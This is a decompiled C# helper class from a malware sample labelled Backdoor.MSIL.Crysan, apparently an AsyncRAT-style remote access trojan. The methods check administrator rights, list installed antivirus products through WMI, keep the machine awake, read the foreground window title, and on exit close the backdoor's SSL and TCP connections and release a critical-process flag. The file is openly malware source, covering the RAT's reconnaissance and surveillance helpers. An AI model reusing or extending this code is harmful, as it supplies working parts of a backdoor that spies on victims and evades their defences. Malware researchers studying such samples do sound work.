// Decompiled with JetBrains decompiler
// Type: Client.Helper.Methods
// Assembly: AsyncClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A19C81AD-DCA7-4942-AD7B-C0D73F667431
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\Backdoor.MSIL.Crysan.ecy-9f340084a105595091444c4fe491dcb4cee297c296812165dcbe4f23579fff1a.exe

using Client.Connection;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Management;
using System.Security.Principal;
using System.Text;

namespace Client.Helper
{
  public static class Methods
  {
    public static bool IsAdmin() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

    public static void ClientOnExit()
    {
      try
      {
        if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
          ProcessCritical.Exit();
        MutexControl.CloseMutex();
        ClientSocket.SslClient?.Close();
        ClientSocket.TcpClient?.Close();
      }
      catch
      {
      }
    }

    public static string Antivirus()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
        {
          List<string> stringList = new List<string>();
          foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
            stringList.Add(managementBaseObject["displayName"].ToString());
          return stringList.Count == 0 ? "N/A" : string.Join(", ", stringList.ToArray());
        }
      }
      catch
      {
        return "N/A";
      }
    }

    public static ImageCodecInfo GetEncoder(ImageFormat format)
    {
      foreach (ImageCodecInfo imageDecoder in ImageCodecInfo.GetImageDecoders())
      {
        if (imageDecoder.FormatID == format.Guid)
          return imageDecoder;
      }
      return (ImageCodecInfo) null;
    }

    public static void PreventSleep()
    {
      try
      {
        int num = (int) NativeMethods.SetThreadExecutionState(NativeMethods.EXECUTION_STATE.ES_CONTINUOUS | NativeMethods.EXECUTION_STATE.ES_DISPLAY_REQUIRED | NativeMethods.EXECUTION_STATE.ES_SYSTEM_REQUIRED);
      }
      catch
      {
      }
    }

    public static string GetActiveWindowTitle()
    {
      try
      {
        StringBuilder text = new StringBuilder(256);
        if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), text, 256) > 0)
          return text.ToString();
      }
      catch
      {
      }
      return "";
    }
  }
}
